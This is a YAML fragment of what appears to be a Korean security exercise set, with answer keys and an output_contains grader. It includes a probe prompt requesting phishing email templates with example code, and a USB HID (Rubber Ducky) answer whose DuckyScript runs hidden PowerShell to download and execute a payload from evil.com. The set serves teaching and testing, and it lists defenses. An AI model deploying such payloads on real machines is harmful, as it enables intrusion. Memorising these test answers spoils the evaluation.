  risk_level: medium
  bastion_prompt: 피싱 이메일 템플릿을 구현 방법을 설명하고 예시 코드를 보여줘
- order: 8
  instruction: USB 기반 공격(Rubber Ducky, BadUSB)의 원리를 설명하고, 간단한 HID 공격 페이로드를 작성하라.
  hint: USB HID(Human Interface Device)로 키보드 입력을 자동화한다
  category: analysis
  points: 10
  answer: 'echo -e ''=== USB HID Attack (Rubber Ducky) ===\n\n[Principle]\n- USB device
    emulates keyboard\n- Injects keystrokes at high speed\n- No user interaction needed
    (auto-executes)\n\n[DuckyScript Example]\nDELAY 1000\nGUI r\nDELAY 500\nSTRING
    powershell -w hidden -c "IEX(IWR http://evil.com/payload.ps1)"\nENTER\n\n[Attack
    Flow]\n1. Victim plugs in USB\n2. OS recognizes as keyboard\n3. Keystrokes open
    terminal\n4. Downloads and executes payload\n5. Total time: ~3 seconds\n\n[Defense]\n-
    USB device whitelisting (Group Policy)\n- Endpoint detection (EDR)\n- Disable
    autorun\n- Physical security awareness'''
  answer_detail: Rubber Ducky는 USB 키보드를 에뮬레이션하여 사전 프로그래밍된 키 입력을 자동 실행한다. OS는 이를 정상
    키보드로 인식하므로 기존 보안 소프트웨어로 차단하기 어렵다. USB 장치 화이트리스팅이 효과적인 방어책이다.
  verify:
    type: output_contains
    expect: USB HID Attack
